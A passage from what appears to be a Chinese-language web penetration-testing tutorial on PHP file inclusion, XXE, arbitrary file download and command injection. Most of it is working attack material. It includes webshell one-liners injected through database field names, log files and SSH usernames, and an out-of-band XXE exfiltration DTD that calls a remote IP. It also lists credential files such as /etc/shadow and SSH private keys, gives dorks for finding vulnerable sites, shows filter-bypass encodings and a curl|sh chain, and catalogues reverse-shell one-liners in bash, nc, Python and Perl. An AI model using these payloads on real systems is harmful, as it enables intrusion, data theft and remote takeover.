<p>利用：<code>www.xxx.com/melon.php?file=melon.txt&amp;melon=system(&#39;ls&#39;);</code></p>
<p>防止混淆：目录遍历：如果没有文件包含漏洞，仅仅通过在url栏中操作，不论你如何../../../回退，都无法跳出服务器的公开目录，也是就说，你只能请求公开目录中的文件。但是如果有文件包含漏洞，那么我们可以通过传参，../../../../../一直退到服务器的根目录，从而能够目录遍历，即访问服务器上任何一个文件夹中的任何一个文件，不论这个目录是公开目录还是非公开目录。</p>
<p><strong>利用本地包含配合数据库获取shell的一种思路</strong>：</p>
<p>数据库储存表会将表存在相应的文件中。也就说假如我们将某个表的某个字段名，命名为<code>&lt;?php eval($_GET[&#39;melon&#39;]);?&gt;</code>,那么这句话就会被写入到对应的.frm文件中去。</p>
<p>在本地创建melon.php文件代码为    <code>&lt;?php include($_REQUEST[&#39;file&#39;]);?&gt;</code></p>
<p>创建数据库-&gt;创建表-&gt;创建字段为<code>&lt;?php eval($_GET[&#39;melon&#39;]);?&gt;</code></p>
<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%95%B0%E6%8D%AE%E5%BA%93%E5%88%A9%E7%94%A8.png" alt="html">    </p>
<p>图中可以明确的看出一句话已经写进了文件了这时候只需要利用即可</p>
<p> <code>http://www.xxx.com/melon.php?file=../../../../../../../phpStudy/PHPTutorial/MySQL/data/melon/test.frm&amp;melon=phpinfo();</code></p>
<p>还有一个问题就是获取数据库的路径如果没有这一点我们是无法知道frm的位置的，如果有sql注入我们可以通过<code>SELECT @@datadir</code>来获取data文件夹绝对路径然后拼接上我们的 数据库名/表名.frm 就可以了。</p>
<p><strong>利用本地包含配合Apache获取shell的一种思路</strong>：</p>
<p>使用burp对目标站抓包 修改User-Agent: <code>&lt;?php include($_REQUEST[&#39;file&#39;]);?&gt;</code></p>
<p>此时查看Apache日志：</p>
<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/apachelog.png" alt="html">    </p>
<p>利用：<code>http://url/file.php?file=/var/log/apache2/access.log?melon=phpinfo();</code></p>
<p><strong>利用本地包含配合ssh获取shell的思路</strong></p>
<p>首先ssh的登陆日志放在了<code>/var/log/auth.log</code>中</p>
<p>我们让用户名等于php一句话<code>&lt;?php @eval($_GET(&#39;melon&#39;));?&gt;</code></p>
<p>然后查看ssh的日志 利用包含实现getshell</p>
<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/sshlogin.png" alt="html"></p>
<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/sshlog.png" alt="html">    </p>
<p><strong>php伪协议</strong></p>
<p>php://filter 读取源代码并进行base64编码输出，不然会直接当做php代码执行就看不到源代码内容了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php://filter在双off的情况下也可以正常使用；</span><br><span class="line">allow_url_fopen ：off/on</span><br><span class="line">allow_url_include：off/on</span><br></pre></td></tr></table></figure>

<p><code>http://url/file.php?file=php://filter/read=convert.base64-encode/resource=./file.php</code></p>
<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/filebase64.png" alt="html">    </p>
<p>php://input 可以访问请求的原始数据的只读流, 将post请求中的数据作为PHP代码执行。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">allow_url_fopen ：off/on</span><br><span class="line">allow_url_include：on</span><br></pre></td></tr></table></figure>

<p><code>http://localhost:8888/file.php?file=php://input</code> 同时POST <code>&lt;?php phpinfo();?&gt;</code></p>
<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/filephpinput.png" alt="html">    </p>
<p>zip://, bzip2://, zlib:// 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">zip://, bzip2://, zlib://协议在双off的情况下也可以正常使用；</span><br><span class="line">allow_url_fopen ：off/on</span><br><span class="line">allow_url_include：off/on</span><br></pre></td></tr></table></figure>

<p>zip:// 协议</p>
<p>使用方法：zip:// [压缩文件绝对路径]#[压缩文件内的子文件名]</p>
<p>在get请求中#会将后面的参数忽略所以使用get请求时候应进行url编码为%23，且此处经过测试相对路径是不可行，所以只能用绝对路径。</p>
<p><code>http://127.0.0.1:8888/file.php?file=zip://D:/PHPstudy/PHPTutorial/WWW/CRMEB-master/melon.zip%23file.txt</code></p>
<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/phpzip.png" alt="html">    </p>
<p>bzip2:// 协议</p>
<p>使用方法：<code>http://127.0.0.1:8888/file.php?file=compress.bzip2://./melon.bz2</code></p>
<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/phpbz2.png" alt="html">    </p>
<p>zlib:// 协议</p>
<p>使用方法：<code>http://127.0.0.1:8888/file.php?file=compress.zlib://./melon.gz</code></p>
<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/phpgz.png" alt="html">    </p>
<p>data://协议</p>
<p>经过测试官方文档上存在一处问题，经过测试PHP版本5.2，5.3，5.5，7.0；data:// 协议是是受限于allow_url_fopen的，官方文档上给出的是NO，所以要使用data://协议需要满足双on条件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">data://协议必须双在on才能正常使用；</span><br><span class="line">allow_url_fopen ：on</span><br><span class="line">allow_url_include：on</span><br></pre></td></tr></table></figure>

<p>使用方法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8888/file.php?file=data://text/plain,&lt;?php phpinfo()?&gt;</span><br><span class="line">http://127.0.0.1:8888/file.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/phpdata.png" alt="html">    </p>
<h3 id="6-任意文件读取"><a href="#6-任意文件读取" class="headerlink" title="6.任意文件读取"></a>6.任意文件读取</h3><p><strong>XXE（有回显）</strong></p>
<p>PHP代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xxe.php文件</span><br><span class="line">&lt;?php</span><br><span class="line">    libxml_disable_entity_loader (false);</span><br><span class="line">    $xmlfile = file_get_contents(&apos;php://input&apos;);</span><br><span class="line">    $dom = new DOMDocument();</span><br><span class="line">    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); </span><br><span class="line">    $creds = simplexml_import_dom($dom);</span><br><span class="line">    echo $creds;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>对xxe.php发起请求 POST中发送xml数据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//因为本地测试用的是windows 所以就读取system.ini为例</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE creds [  </span><br><span class="line">&lt;!ENTITY melon SYSTEM &quot;file:///c:/windows/system.ini&quot;&gt; ]&gt; </span><br><span class="line">&lt;creds&gt;&amp;melon;&lt;/creds&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/xxe.png" alt="html">    </p>
<p>可以看到响应头获取到了文件的数据</p>
<p><strong>XXE（无回显）</strong></p>
<p>PHP代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xxes.php文件</span><br><span class="line">&lt;?php</span><br><span class="line">libxml_disable_entity_loader (false);</span><br><span class="line">$xmlfile = file_get_contents(&apos;php://input&apos;);</span><br><span class="line">$dom = new DOMDocument();</span><br><span class="line">$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>对xxe.php发起请求 POST中发送xml数据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//因为本地测试用的是windows 所以就读取system.ini为例</span><br><span class="line">&lt;!DOCTYPE roottag [ </span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///D:/PHPstudy/PHPTutorial/WWW/CRMEB-master/melon.txt&quot;&gt; </span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http://47.9x.xx.xx/xxe.dtd&quot;&gt; </span><br><span class="line">%dtd;]&gt; </span><br><span class="line">&lt;name&gt;&amp;send;&lt;/name&gt;</span><br></pre></td></tr></table></figure>

<p>远端服务器存放的dtd代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; </span><br><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &apos;http://47.93.12.104:7777/?%file;&apos;&gt;&quot;&gt; </span><br><span class="line">%all;</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/xxes1.png" alt="html">    </p>
<p>此时xml是执行的但是没有回显出来，我们看一下服务器端。</p>
<p>服务器端采用的nc监听端口</p>
<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/xxes2.png" alt="html">    </p>
<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/xxes3.png" alt="html">    </p>
<p>我们来说一下外部调用实体化的流程：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//localhost为本地服务器 melon为远端服务器</span><br><span class="line">1.localhost 解析了 XML，并将%dtd;求值为 melon 的服务器的外部调用。</span><br><span class="line">2.melon 的服务器向 localhost 返回了xxe.dtd文件。</span><br><span class="line">3.localhost 解析了收到的 DTD文件，它触发了%all;的调用。</span><br><span class="line">4.当%all;求值时，它定义了&amp;send;，它包含%file;实体的调用。</span><br><span class="line">5.%file;在 URL 值中被替换为/etc/passwd文件的内容。</span><br><span class="line">6.localhost 解析了 XML 文件，发现了&amp;send;实体，它求值为 melon 服务器的远程调用，带有melon.txt的内容，作为 URL 中的参数。</span><br></pre></td></tr></table></figure>

<h3 id="7-任意文件下载"><a href="#7-任意文件下载" class="headerlink" title="7.任意文件下载"></a>7.任意文件下载</h3><p><strong>漏洞形成过程</strong></p>
<p>首先漏洞源码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//FileAcquisition.php</span></span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">    $filename = $_GET[<span class="string">'filename'</span>];  </span><br><span class="line">    <span class="keyword">echo</span> file_get_contents($filename);  </span><br><span class="line">    header(<span class="string">'Content-Type: imgage/jpeg'</span>);  </span><br><span class="line">    header(<span class="string">'Content-Disposition: attachment; filename='</span>.$filename);  </span><br><span class="line">    header(<span class="string">'Content-Lengh: '</span>.filesize($filename));  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/file1.png" alt="html">    </p>
<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/file2.png" alt="html">    </p>
<p>跨目录下载：</p>
<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/file3.png" alt="html">    </p>
<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/file4.png" alt="html">    </p>
<p>说一下敏感文件：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//Windows下</span><br><span class="line">C:\boot.ini //查看系统版本</span><br><span class="line">C:\Windows\System32\inetsrv\MetaBase.xml //IIS配置文件</span><br><span class="line">C:\Windows\repair\sam //存储系统初次安装的密码</span><br><span class="line">C:\Program Files\mysql\my.ini //Mysql配置</span><br><span class="line">C:\Program Files\mysql\data\mysql\user.MYD //Mysql root</span><br><span class="line">C:\Windows\php.ini //php配置信息</span><br><span class="line">C:\Windows\my.ini //Mysql配置信息</span><br><span class="line">C:\Windows\win.ini //Windows系统的一个基本系统配置文件</span><br><span class="line"></span><br><span class="line">//Linux下</span><br><span class="line">root/.ssh/authorized_keys ////如需登录到远程主机，需要到.ssh目录下，新建authorized_keys文件，并将id_rsa.pub内容复制进去</span><br><span class="line">/root/.ssh/id_rsa //ssh私钥,ssh公钥是id_rsa.pub</span><br><span class="line">/root/.ssh/id_ras.keystore //记录每个访问计算机用户的公钥</span><br><span class="line">/root/.ssh/known_hosts //记录每个访问计算机用户的公钥</span><br><span class="line">/etc/passwd</span><br><span class="line">/etc/shadow //账户密码文件</span><br><span class="line">/etc/my.cnf //mysql配置文件</span><br><span class="line">/etc/httpd/conf/httpd.conf //apache配置文件</span><br><span class="line">/root/.bash_history //用户历史命令记录文件</span><br><span class="line">/root/.mysql_history //mysql历史命令记录文件</span><br><span class="line">/proc/mounts //记录系统挂载设备</span><br><span class="line">/porc/config.gz //内核配置文件</span><br><span class="line">/var/lib/mlocate/mlocate.db //全文件路径</span><br><span class="line">/porc/self/cmdline //当前进程的cmdline参数</span><br></pre></td></tr></table></figure>

<p>补：<a href="https://github.com/tdifg/payloads/blob/master/lfi.txt" target="_blank" rel="noopener">大佬搜集的一部分linux的敏感文件路径</a></p>
<p><strong>漏洞挖掘</strong>：</p>
<p>可以用Google hack：<code>inurl:&quot;file.php?file=&quot; inurl : readfile.php?file= inurl : download.php?file=</code></p>
<p>观察页面是否实现这种功能：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">download.php?path=</span><br><span class="line">download.php?file=</span><br><span class="line">down.php?file=</span><br><span class="line">data.php?file=</span><br><span class="line">readfile.php?file=</span><br><span class="line">read.php?filename=</span><br></pre></td></tr></table></figure>

<p>观察链接参数名路径名：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&amp;RealPath= &amp;FilePath= &amp;ﬁlepath= &amp;Filepath= &amp;Path= &amp;path= &amp;inputFile= &amp;Inputfile= &amp;url= &amp;urls= &amp;Lang= &amp;dis= &amp;data= &amp;Data= &amp;readﬁle= &amp;ﬁlep= &amp;src= &amp;menu=</span><br><span class="line"></span><br><span class="line">//java的重要路径</span><br><span class="line">/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</span><br><span class="line">/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中</span><br><span class="line">/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件</span><br><span class="line">/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。</span><br><span class="line">/WEB-INF/database.properties：数据库配置文件</span><br><span class="line">漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码</span><br></pre></td></tr></table></figure>

<p>Linux下一种思路：在linux中有这样一个命令 locate 是用来查找文件或目录的，它不搜索具体目录，而是搜索一个数据库/var/lib/mlocate/mlocate.db。这个数据库中含有本地所有文件信息。Linux系统自动创建这个数据库，并且每天自动更新一次。可以算是一个杀器吧。</p>
<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/locate.png" alt="html">    </p>
<h3 id="8-远程代码或系统命令执行-RCE"><a href="#8-远程代码或系统命令执行-RCE" class="headerlink" title="8.远程代码或系统命令执行(RCE)"></a>8.远程代码或系统命令执行(RCE)</h3><p>首先我们了解一下命令拼接符：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&amp;&amp;        第一个命令执行成功才会执行第二个命令否则不能继续执行</span><br><span class="line">&amp;		 即使第一个command1没有执行成功，也会执行command2 执行成功则都执行</span><br><span class="line">|    	 不管command1是否执行成功，都执行command2，不返回command1的结果 上一条命令的输出，作为下一条命令参数</span><br><span class="line">|| 		 表示上一条命令执行失败后，才执行下一条命令</span><br><span class="line">;		 分号表示命令依次执行。</span><br><span class="line"></span><br><span class="line">linux中：%0a 、%0d 、; 、&amp; 、| 、&amp;&amp;、||</span><br><span class="line">windows中：%0a、&amp;、|、%1a（一个神奇的角色，作为.bat文件中的命令分隔符）</span><br></pre></td></tr></table></figure>

<p>这里我们以DVWA为例代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Submit'</span> ]  ) ) &#123;</span><br><span class="line">    $target = $_POST[ <span class="string">'ip'</span> ];</span><br><span class="line">    <span class="comment">//下面判断系统</span></span><br><span class="line">    <span class="keyword">if</span>( stristr( php_uname( <span class="string">'s'</span> ), <span class="string">'Windows NT'</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Windows</span></span><br><span class="line">        $cmd = shell_exec( <span class="string">'ping  '</span> . $target );</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Unix</span></span><br><span class="line">        $cmd = shell_exec( <span class="string">'ping  -c 4 '</span> . $target );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/DVWARCE.png" alt="html">    </p>
<p><strong>空格绕过</strong></p>
<p>Linux不能使用空格时的一些绕过 例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo$IFS&quot;&lt;?php system($_GET[x]);?&gt;&quot;&gt;shell.php  </span><br><span class="line">//$IFS$9,$&#123;IFS&#125;，$IFS 都可以 $IFS在linux下表示分隔符，但是如果单纯的cat$IFS2,bash解释器会把整个IFS2当做变量名，所以导致输不出来结果，然而如果加一个&#123;&#125;就固定了变量名，同理在后面加个$可以起到截断的作用，但是为什么要用$9呢，因为$9只是当前系统shell进程的第九个参数的持有者，它始终为空字符串。</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/IFS.png" alt="html">    </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;echo,&apos;Melon&apos;&#125;&gt;test.php</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/wshell.png" alt="html"></p>
<p><strong>黑名单拼接绕过</strong></p>
<p><code>a=l;b=s;$a$b</code></p>
<p><strong>黑名单编码绕过</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">base64:</span><br><span class="line">echo &quot;bWVsb24K&quot;|base64 -d 其将会打印melon //echo &quot;字符串&quot; |base 则是直接加密</span><br><span class="line">echo &quot;Y2F0IC9mbGFn&quot;|base64-d|bash //等同于 cat /flag</span><br><span class="line"></span><br><span class="line">HEX:</span><br><span class="line">echo &quot;melon&quot; | xxd</span><br><span class="line">echo &quot;636174202f666c6167&quot; | xxd -r -p|bash</span><br><span class="line"></span><br><span class="line">oct:</span><br><span class="line">$(printf &quot;\154\163&quot;) //ls</span><br><span class="line">$(printf &quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;) //cat /flag</span><br><span class="line">&#123;printf,&quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;&#125;|\$0 //cat /flag</span><br><span class="line">#可以通过这样来写webshell,内容为&lt;?php @eval($_POST[&apos;c&apos;]);?&gt;</span><br><span class="line">$&#123;printf,&quot;\74\77\160\150\160\40\100\145\166\141\154\50\44\137\120\117\123\124\133\47\143\47\135\51\73\77\76&quot;&#125; &gt;&gt; 1.php</span><br><span class="line"></span><br><span class="line">单引号和双引号绕过:</span><br><span class="line">例：ca&apos;&apos;t flag 或 ca&quot;&quot;t flag</span><br><span class="line"></span><br><span class="line">反斜杠绕过:</span><br><span class="line">比如：ca\t fl\ag</span><br><span class="line"></span><br><span class="line">利用Shell 特殊变量绕过:</span><br><span class="line">//n 是一个数字，表示第几个参数。例如，第一个参数是1，第二个参数是2。而参数不存在时其值为空。</span><br><span class="line">ca$@t fla$@g</span><br><span class="line">ca$1t fla$2g</span><br></pre></td></tr></table></figure>

<p><strong>长度限制绕过</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">需要用的知识点:</span><br><span class="line">linux下可以用 &gt;a 创建文件名为a的空文件 // &gt;是覆盖 &gt;&gt;是追加 我们一行一行写肯定选择追加</span><br><span class="line">ls -t&gt;test则会将目录按时间排序后写进test文件中 //我们需要反着写也就是从构造好的payload的下面写到上面</span><br><span class="line">sh命令可以从一个文件中读取命令来执行</span><br><span class="line">在linux中，当我们执行文件中的命令的时候，我们通过在没有写完的命令后面加 &quot;\&quot;，可以将一条命令写在多行</span><br></pre></td></tr></table></figure>

<p>测试在文本里内容如下:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//melon.txt 真实的话文件名要改成 a 因为是绕长度限制</span><br><span class="line">ec\</span><br><span class="line">ho \</span><br><span class="line">hello \</span><br><span class="line">world!</span><br></pre></td></tr></table></figure>

<p>执行：<code>sh melon.txt</code></p>
<p>那怎样将内容输出到文本当中就是我们需要做的事 </p>
<p>下面是我们的解决方案：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; &quot;rld&quot;</span><br><span class="line">&gt; &quot;wo\\&quot;</span><br><span class="line">&gt; &quot;llo \\&quot;</span><br><span class="line">&gt; &quot;he\\&quot;</span><br><span class="line">&gt; &quot;echo \\&quot;</span><br><span class="line">ls -t &gt; _</span><br><span class="line">sh _</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%8B%BC%E6%8E%A5hello.png" alt="html"></p>
<p>第一行显示找不到因为先创建 _ 文件再进行输出到_文件里。</p>
<p>这里使用了两个 \ 是因为我们需要转义掉多行命令的换行，如果我们只使用一个 \ 那么就会被误解为正在多行执行命令</p>
<p>这方面也有对应的CTF题目 源码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(E_ALL);</span><br><span class="line">    $sandbox = <span class="string">'/var/www/html/sandbox/'</span>.md5(<span class="string">"orange"</span>.$_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    mkdir($sandbox);</span><br><span class="line">    chdir($sandbox);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>]) &amp;&amp; strlen($_GET[<span class="string">'cmd'</span>]) &lt;= <span class="number">5</span>) &#123;</span><br><span class="line">        exec($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'reset'</span>])) &#123;</span><br><span class="line">        exec(<span class="string">'/bin/rm -rf '</span> . $sandbox);</span><br><span class="line">    &#125;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>哪可不可以利用这种方法反弹shell呢？当然是可以的具体操作如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/vps的ip/监听的端口 0&gt;&amp;1 //标准的反弹shell命令</span><br><span class="line">&gt;\ \\</span><br></pre></td></tr></table></figure>

<p>这个时候我们遇到了两个个问题 </p>
<p>其一：<code>ls -t&gt;_</code> 也就是当我们吧文件全部创建好按时间将文件名输入到a文件中时发现我们的命令是七个字符我们需要一个先把这条命令写出来才行</p>
<p>其二：执行命令需要空格 但是我们需要两个空格 相同的文件怎么可以创建两个呢 这时候可以用 <code>curl url|sh</code> 的方式 只需要再服务器上构建好payload就可以了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">解决问题一</span><br><span class="line">&gt;ls\\ //创建 &quot;ls\&quot; 文件</span><br><span class="line">ls&gt;_  //将ls的排序写入&quot;_&quot;文件 此时文件内容为 &quot;_ ls\&quot;</span><br><span class="line">&gt;\ \\ //创建 &quot; \&quot;文件</span><br><span class="line">&gt;-t\\ //创建&quot;-t\&quot;文件</span><br><span class="line">&gt;\&gt;y  //创建&quot;&gt;y&quot;文件</span><br><span class="line">// ls命令排序的规则是空格和符号最前，数字其次，字母最后</span><br><span class="line">ls&gt;&gt;_ //将ls的排序追加到&quot;_&quot;文件</span><br><span class="line">//ls排序结果如下：</span><br><span class="line">&quot; \&quot;  &quot;_&quot;  &quot;ls\&quot;  &quot;-t\&quot; &quot;&gt;y&quot;</span><br><span class="line">追加之后&quot;_&quot;的内容为：</span><br><span class="line">_</span><br><span class="line">ls\</span><br><span class="line">\</span><br><span class="line">_</span><br><span class="line">ls\</span><br><span class="line">-t\</span><br><span class="line">&gt;y</span><br><span class="line">执行:sh _ 生成一个m文件</span><br></pre></td></tr></table></figure>



<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">我们需要sh m 其中 m 中包含了 curl xx.xx.xx.xxx|sh</span><br></pre></td></tr></table></figure>

<p>构造payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;bash</span><br><span class="line">&gt;\|\\</span><br><span class="line">&gt;x\\</span><br><span class="line">&gt;xx\\</span><br><span class="line">&gt;x.\\</span><br><span class="line">&gt;xx\\</span><br><span class="line">&gt;x.\\</span><br><span class="line">&gt;xx\\</span><br><span class="line">&gt;x.\\</span><br><span class="line">&gt;xx\\</span><br><span class="line">&gt;\ \\</span><br><span class="line">&gt;rl\\</span><br><span class="line">&gt;cu\\</span><br><span class="line">//这里有一个坑就是创建文件不能以 .开头 否则为隐藏文件ls -t读取的时候读不到 我也尝试构造&quot;_&quot;的时候添加-a参数来达到目的 但好像不可能的事情 或许也是我没想到 欢迎师傅们提出意见 </span><br><span class="line">//为什么我要说到这里 因为我服务器的IP正好构造的时候会出现同名文件 以点开头构造又没法绕过 用域名云空间Github或者ip的每位全是三位的都可以 方法还是很多的</span><br></pre></td></tr></table></figure>

<p>利用：这时我们用”_”文件生成”y”文件 用y文件查看服务器反弹shell命令通过管道符执行命令 成功反弹shell</p>
<p><strong>内联执行</strong></p>
<p>命令替代，大部分Unix shell以及编程语言如Perl、PHP以及Ruby等都以成对的重音符(反引号)作指令替代，意思是以某一个指令的输出结果作为另一个指令的输入项。</p>
<p>例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &quot;a`pwd`&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/neilian.png" alt="html"></p>
<p><strong>通配符</strong></p>
<p>[…]<code>表示匹配方括号之中的任意一个字符。
比如</code>[aeiou]<code>可以匹配五个元音字母，</code>[a-z]`匹配任意小写字母。<br>{…}表示匹配大括号里面的所有模式，模式之间使用逗号分隔。</p>
<p><code>{...}</code>与<code>[...]</code>有一个很重要的区别。如果匹配的文件不存在，<code>[...]</code>会失去模式的功能，变成一个单纯的字符串，而<code>{...}</code>依然可以展开。</p>
<p>测试如下：</p>
<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/catsh_1.png" alt="html"></p>
<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/catsh_2.png" alt="html"></p>
<p><strong>反弹shell</strong></p>
<p>bash方式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ bash -c &quot;sh &gt;&amp; /dev/tcp/your ip/port 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure>

<p>exec方式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ exec 5&lt;&gt;/dev/tcp/ip/port</span><br><span class="line">$ cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done</span><br></pre></td></tr></table></figure>

<p>nc方式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">本机运行:</span><br><span class="line">nc -l -vv -p port</span><br><span class="line">目标主机:</span><br><span class="line">nc -e /bin/bash ip port</span><br></pre></td></tr></table></figure>

<p>python方式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;ip&quot;,port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -c &quot;exec(\&quot;import socket, subprocess;s = socket.socket();s.connect((&apos;ip&apos;,port))\nwhile 1:  proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\&quot;)&quot;</span><br></pre></td></tr></table></figure>

<p>Perl</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">perl -e &apos;use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&apos;</span><br></pre></td></tr></table></figure>

<p>PHP</p>
